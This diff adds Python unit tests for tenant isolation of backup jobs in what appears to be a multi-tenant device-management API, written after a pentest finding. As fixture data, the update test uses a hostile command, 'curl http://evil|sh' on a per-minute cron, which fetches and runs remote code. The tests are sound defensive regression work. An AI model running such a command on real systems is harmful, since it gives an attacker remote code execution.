@@ -221,6 +221,72 @@ class TestSnmpUptimeCoercion(unittest.TestCase):
         self.assertEqual(out['sysUpTime'], 123456)
 
 
+class TestBackupJobTenantIsolation(_TenantBase):
+    """v6.3.0 pentest: backup jobs are device-keyed, so list/update/delete must
+    tenant-gate (run/restore/archives already re-filter). Without the gate a
+    tenant admin could read another tenant's job secrets, and edit its command/
+    cron to reach cross-tenant root RCE via the cron sweep."""
+
+    def _seed_job_for(self, dev):
+        self.api.save(self.api.BACKUP_JOBS_FILE, {'jobs': [{
+            'id': 'jA', 'name': 'nightly', 'type': 'command',
+            'command': 'restic backup /etc --password-file /root/.pw',
+            'device_ids': [dev], 'device_id': dev, 'enabled': True, 'cron': None}]})
+
+    def test_list_hides_other_tenant_job(self):
+        self._seed_job_for('devA')          # a tenantA job
+        self._as('tenantB')
+        try:
+            self.api.handle_backup_jobs_list()
+        except (self.api.HTTPError, SystemExit):
+            pass
+        jobs = (self.cap.get('d') or {}).get('jobs', [])
+        self.assertEqual(jobs, [], 'tenant B must not see tenant A backup jobs')
+        # and secrets in the command must not leak
+        self.assertNotIn('password-file', repr(self.cap.get('d')))
+
+    def test_list_shows_own_and_superadmin_sees_all(self):
+        self._seed_job_for('devA')
+        self._as('tenantA')
+        try:
+            self.api.handle_backup_jobs_list()
+        except (self.api.HTTPError, SystemExit):
+            pass
+        self.assertEqual(len(((self.cap.get('d') or {}).get('jobs', []))), 1)
+        self.cap.clear()
+        self._as(self.api.DEFAULT_TENANT)
+        try:
+            self.api.handle_backup_jobs_list()
+        except (self.api.HTTPError, SystemExit):
+            pass
+        self.assertEqual(len(((self.cap.get('d') or {}).get('jobs', []))), 1)
+
+    def test_update_blocked_cross_tenant(self):
+        self._seed_job_for('devA')
+        self._as('tenantB')
+        self.api.method = lambda: 'PUT'
+        self.api.get_json_obj = lambda: {'command': 'curl http://evil|sh', 'cron': '* * * * *'}
+        try:
+            self.api.handle_backup_job_update('jA')
+        except (self.api.HTTPError, SystemExit):
+            pass
+        self.assertEqual(self.cap.get('s'), 404)
+        # the job's command must be UNCHANGED
+        stored = (self.api.load(self.api.BACKUP_JOBS_FILE) or {}).get('jobs', [])[0]
+        self.assertNotIn('evil', stored['command'])
+
+    def test_delete_blocked_cross_tenant(self):
+        self._seed_job_for('devA')
+        self._as('tenantB')
+        self.api.method = lambda: 'DELETE'
+        try:
+            self.api.handle_backup_job_delete('jA')
+        except (self.api.HTTPError, SystemExit):
+            pass
+        self.assertEqual(self.cap.get('s'), 404)
+        self.assertEqual(len((self.api.load(self.api.BACKUP_JOBS_FILE) or {}).get('jobs', [])), 1)
+
+
 class TestDashboardTicketsIsolation(_TenantBase):
     """H2: the dashboard Tickets card (_dashboard_tickets) skipped filtering for a
     tenant admin (scope None), leaking every tenant's alerts."""
